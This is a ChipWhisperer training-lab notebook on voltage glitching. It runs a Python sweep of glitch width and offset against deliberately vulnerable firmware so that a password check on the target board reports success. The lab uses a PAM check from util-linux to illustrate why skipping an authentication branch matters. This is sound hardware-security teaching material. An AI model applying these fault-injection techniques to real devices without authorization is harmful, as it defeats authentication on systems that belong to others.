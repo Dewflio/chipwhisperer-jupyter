{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Part 2, Topic 2: Voltage Glitching to Bypass Password"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "NOTE: This lab references some (commercial) training material on [ChipWhisperer.io](https://www.ChipWhisperer.io). You can freely execute and use the lab per the open-source license (including using it in your own courses if you distribute similarly), but you must maintain notice about this source location. Consider joining our training course to enjoy the full experience.\n",
    "\n",
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**SUMMARY:** *We've seen how voltage glitching can be used to corrupt calculations. Let's continue on and see if it can also be used to break past a password check.*\n",
    "\n",
    "**LEARNING OUTCOMES:**\n",
    "\n",
    "* Applying previous glitch settings to new firmware\n",
    "* Checking for success and failure when glitching"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Firmware\n",
    "\n",
    "In the previous lab, we saw how voltage glitching can be used to cause faults on a target. In the previous lab, we used this to disrupt a calculation. In this lab, we'll look at something a little more realistic. Consider the following code from `linux-util-2.24`:\n",
    "\n",
    "```C\n",
    "/*\n",
    " *   auth.c -- PAM authorization code, common between chsh and chfn\n",
    " *   (c) 2012 by Cody Maloney <cmaloney@theoreticalchaos.com>\n",
    " *\n",
    " *   this program is free software.  you can redistribute it and\n",
    " *   modify it under the terms of the gnu general public license.\n",
    " *   there is no warranty.\n",
    " *\n",
    " */\n",
    "\n",
    "#include \"auth.h\"\n",
    "#include \"pamfail.h\"\n",
    "\n",
    "int auth_pam(const char *service_name, uid_t uid, const char *username)\n",
    "{\n",
    "    if (uid != 0) {\n",
    "        pam_handle_t *pamh = NULL;\n",
    "        struct pam_conv conv = { misc_conv, NULL };\n",
    "        int retcode;\n",
    "\n",
    "        retcode = pam_start(service_name, username, &conv, &pamh);\n",
    "        if (pam_fail_check(pamh, retcode))\n",
    "            return FALSE;\n",
    "\n",
    "        retcode = pam_authenticate(pamh, 0);\n",
    "        if (pam_fail_check(pamh, retcode))\n",
    "            return FALSE;\n",
    "\n",
    "        retcode = pam_acct_mgmt(pamh, 0);\n",
    "        if (retcode == PAM_NEW_AUTHTOK_REQD)\n",
    "            retcode =\n",
    "                pam_chauthtok(pamh, PAM_CHANGE_EXPIRED_AUTHTOK);\n",
    "        if (pam_fail_check(pamh, retcode))\n",
    "            return FALSE;\n",
    "\n",
    "        retcode = pam_setcred(pamh, 0);\n",
    "        if (pam_fail_check(pamh, retcode))\n",
    "            return FALSE;\n",
    "\n",
    "        pam_end(pamh, 0);\n",
    "        /* no need to establish a session; this isn't a\n",
    "         * session-oriented activity...  */\n",
    "    }\n",
    "    return TRUE;\n",
    "}\n",
    "```\n",
    "\n",
    "This code controls [authentication in Linux](https://en.wikipedia.org/wiki/Linux_PAM). You can see it doing a series of checks and, if any of these checks fail, the function returns `FALSE` and the authentication fails. If all these checks pass, then the authentication succeeds. This seems pretty secure, but consider what would happen if we were able to corrupt that `uid != 0` check at the beginning of the code similar to how we corrupted the calculation in the previous lab: we might be able to get the code to jump straight to the end and bypass all those other authentication checks!\n",
    "\n",
    "We don't be attacking Linux code in this lab, but we will be attacking something similar - a password check. The password check is in the same `simpleserial-glitch` firmware from the previous lab. This is the code for the password check:\n",
    "\n",
    "```C\n",
    "uint8_t password(uint8_t* pw)\n",
    "{\n",
    "    char passwd[] = \"touch\";\n",
    "    char passok = 1;\n",
    "    int cnt;\n",
    "\n",
    "    trigger_high();\n",
    "\n",
    "    //Simple test - doesn't check for too-long password!\n",
    "    for(cnt = 0; cnt < 5; cnt++){\n",
    "        if (pw[cnt] != passwd[cnt]){\n",
    "            passok = 0;\n",
    "        }\n",
    "    }\n",
    "    \n",
    "    trigger_low();\n",
    "    \n",
    "    simpleserial_put('r', 1, (uint8_t*)&passok);\n",
    "    return passok;\n",
    "}\n",
    "```\n",
    "\n",
    "Let's connect to the scope and check out this password check:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SCOPETYPE = 'OPENADC'\n",
    "PLATFORM = 'CWLITEARM'\n",
    "SS_VER = 'SS_VER_2_1'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%run \"../Setup_Scripts/Setup_Generic.ipynb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash -s \"$PLATFORM\" \"$SS_VER\"\n",
    "cd ../../hardware/victims/firmware/simpleserial-glitch\n",
    "make PLATFORM=$1 CRYPTO_TARGET=NONE SS_VER=$2 -j"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "fw_path = \"../../hardware/victims/firmware/simpleserial-glitch/simpleserial-glitch-{}.hex\".format(PLATFORM)\n",
    "cw.program_target(scope, prog, fw_path)\n",
    "if SS_VER==\"SS_VER_2_1\":\n",
    "    target.reset_comms()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's try to communicate with the target. The password command on `simpleserial-glitch` is `\"p\"`, takes a 5 byte long password and sends back a 1-byte `\"r\"` packet. This `\"r\"` packet will be 0 if the password is incorrect and 1 if it is correct."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Do glitch loop\n",
    "reboot_flush()\n",
    "pw = bytearray([0x00*5])\n",
    "target.simpleserial_write('p', pw)\n",
    "\n",
    "val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check\n",
    "valid = val['valid']\n",
    "if valid:\n",
    "    response = val['payload']\n",
    "    raw_serial = val['full_response']\n",
    "    error_code = val['rv']\n",
    "\n",
    "print(val)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, let's setup our glitch. We'll make use of the `vglitch_setup()` method to do the setup:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.vglitch_setup('hp', default_setup=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now all we need to do is setup the glitch controller and write another glitch loop. We're not doing calibration of the glitch this time, so there's no need to add a \"repeat\" parameter."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "gc = cw.GlitchController(groups=[\"success\", \"reset\", \"normal\"], parameters=[\"width\", \"offset\", \"ext_offset\"])\n",
    "gc.display_stats()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "gc.glitch_plot(plotdots={\"success\":\"+g\", \"reset\":\"xr\", \"normal\":None})"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Setup your width, offset, and ext_offset ranges and steps. You should use width/offset ranges that worked for you in the last lab. As for ext_offset, it shouldn't be too far beyond the trigger, so something like 0-150 should work."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "gc.set_range(\"ext_offset\", 0, 150)\n",
    "gc.set_range(\"width\", 1900, 1901)\n",
    "gc.set_range(\"offset\", 2000, 2500)\n",
    "gc.set_global_step([50])\n",
    "        \n",
    "gc.set_step(\"ext_offset\", 1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#disable logging\n",
    "cw.set_all_log_levels(cw.logging.CRITICAL)\n",
    "\n",
    "scope.adc.timeout = 0.1\n",
    "successes = 0\n",
    "\n",
    "reboot_flush()\n",
    "\n",
    "for glitch_settings in gc.glitch_values():\n",
    "    scope.glitch.width = glitch_settings[0]\n",
    "    scope.glitch.offset = glitch_settings[1]\n",
    "    scope.glitch.ext_offset = glitch_settings[2]\n",
    "    \n",
    "    if scope.adc.state:\n",
    "        # can detect crash here (fast) before timing out (slow)\n",
    "        gc.add(\"reset\")\n",
    "        reboot_flush()\n",
    "\n",
    "    scope.arm()\n",
    "    target.simpleserial_write('p', bytearray([0]*5))\n",
    "    ret = scope.capture()\n",
    "    \n",
    "    if ret:\n",
    "        gc.add(\"reset\")\n",
    "        reboot_flush()\n",
    "    else:\n",
    "        val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10, timeout=50)#For loop check\n",
    "        if val['valid'] is False:\n",
    "            gc.add(\"reset\")\n",
    "        else:\n",
    "            if val['payload'] == bytearray([1]): #for loop check\n",
    "                successes +=1 \n",
    "                gc.add(\"success\")\n",
    "                print(val)\n",
    "                print(val['payload'])\n",
    "                print(scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset)\n",
    "                print(\"🐙\", end=\"\")\n",
    "            else:\n",
    "                gc.add(\"normal\")\n",
    "                    \n",
    "#reenable logging\n",
    "cw.set_all_log_levels(cw.logging.WARNING)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If you didn't get any glitches, try picking another area for your width/offset ranges.\n",
    "\n",
    "Let's see where we needed to target for our glitch to work:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "gc.calc([\"width\", \"offset\"], \"success_rate\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
